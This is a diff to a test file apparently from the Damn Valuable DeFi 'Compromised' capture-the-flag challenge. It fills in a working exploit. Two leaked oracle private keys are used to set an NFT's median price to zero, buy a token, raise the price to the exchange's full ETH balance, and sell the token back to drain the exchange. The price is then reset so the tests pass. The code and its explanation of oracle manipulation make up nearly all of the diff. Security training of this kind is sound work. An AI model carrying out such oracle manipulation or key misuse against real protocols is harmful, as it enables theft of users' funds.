@@ -59,8 +59,43 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {
+        /** EXPLOIT
+            The challenge begins by decoding the given information from the web server. Turns out its the private keys for two of the trusted oracle accounts !
+            Using these, its possible to set the median price of the NFTs (since the median is calculated from the middle value in a sorted array) to any value we want.
+            Hence, an attacker can buy one NFT for zero and sell it at the price of the exchange total balance to empty it.
+        */
+        
+        const compromised_signers = [
+            new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider), // Private key of 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
+            new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider) // Private key of 0x81A5D6E50C214044bE44cA0CB057fe119097850c
+        ]; // Extracted from 'decode_server_data.py' script
+
+        this.exchangeAttackerInstance = await this.exchange.connect(attacker);
+
+        for (const signer of compromised_signers) {
+            await (await this.oracle.connect(signer)).postPrice("DVNFT", 0); // Sets NFT prices to zero
+        }
+
+        expect(
+            await this.oracle.getMedianPrice("DVNFT")
+        ).to.equal('0');
+
+        const buyTx = await (await this.exchangeAttackerInstance.buyOne({value: 1})).wait() // Buy one NFT, need to send some Wei that will be refunded by the exchange
+        const buyEvent = buyTx.events.find(event => event.event === 'TokenBought');
+        const [buyer, tokenId, price] = buyEvent.args;   
+        console.log(buyer, "bought token #" + tokenId.toString() + " for " + price.toString() + " Wei !");
+
+        for (const signer of compromised_signers) {
+            await (await this.oracle.connect(signer)).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE); // Sets NFT prices to balance of exchange contract
+        }
+
+        await (await this.nftToken.connect(attacker)).approve(this.exchange.address, tokenId); // Approve NFT transfer from exchange
+        await this.exchangeAttackerInstance.sellOne(tokenId); // Sell it full price !
+
+        for (const signer of compromised_signers) {
+            await (await this.oracle.connect(signer)).postPrice("DVNFT", INITIAL_NFT_PRICE); // Sets NFT prices back to original to pass tests
+        }
     });
 
     after(async function () {
